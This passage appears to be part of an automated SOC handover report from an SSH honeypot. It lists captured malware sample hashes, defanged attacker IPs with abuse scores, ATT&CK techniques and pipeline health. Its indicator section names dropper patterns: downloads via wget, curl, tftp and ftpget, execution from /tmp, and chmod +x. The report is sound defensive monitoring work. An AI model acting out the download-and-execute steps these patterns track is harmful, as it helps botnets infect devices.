| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `203.192.211[.]180` | IN | Indusind Media And Communication Ltd. | **100** ⚠️ | 46 |
| `45.79.8[.]221` | US | Linode | **100** ⚠️ | 50 |
| `178.178.222[.]59` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `90.230.226[.]175` | SE | Telia Network Services | **100** ⚠️ | 50 |
| `195.88.120[.]62` | RU | Parus-Telecom Ltd. | **100** ⚠️ | 50 |
| `89.126.222[.]163` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 7 |
| `221.120.57[.]125` | TW | CHT-Mobile Business Group,Chunghwa | **100** ⚠️ | 50 |
| `65.20.133[.]56` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `182.156.80[.]11` | IN | TTSL-ISP DIVISION | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 90 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 84 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 191 cases |
| Tool 34  | Credential Extractor        | ✅ 104 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 60 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (5.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 84 priority case(s) shown individually · 24 recon entry/entries in table (10 group(s) consolidating 83 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-20T12:56:26Z_
